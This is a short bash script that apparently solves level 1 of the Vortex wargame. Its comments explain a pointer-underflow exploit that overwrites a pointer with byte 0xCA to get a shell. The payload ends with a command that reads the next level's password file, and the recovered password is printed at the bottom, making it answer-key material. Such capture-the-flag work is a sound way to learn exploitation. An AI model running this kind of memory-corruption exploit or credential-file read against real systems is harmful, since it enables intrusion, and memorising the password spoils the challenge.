#!/bin/bash

#The python script simply outputs 261 backslashes, followed by the character with a hex value of CA, followed by an unholy amount of a's
#We then add a semicolon and the command to see the password to the end of the string and pipe it all to the vortex1 program
#The backslashes decrement our pointer to s actual location of the pointer (256 away from it's starting position, plus 4 more because ptr is an unsigned char, plus 1 more to move right behind ptr so ptr++[0]=x rewrites on the addres of ptr
#The \xCA character is then written to the buf-4 position. When e() is called, the program sees that pointer now stores 0xCA?????? instead of an actual address to the buffer
#This causes an interactive shell to pop up. We feed in 4000 a's so that we can actually use the shell before the program locks us out.
#We feed in a semicolon to have the shell execute the last characters we sent it (should be a ton of a's that do nothing) and accept a new command
#We then give the shell a command to view the contents of the vortex2 password, and BAM, problem solved.  
python -c 'print("\\"*261 + "\xCA" + "a"*4000 + ";cat /etc/vortex_pass/vortex2")' | /vortex/vortex1

#The password is 23anbT\rE
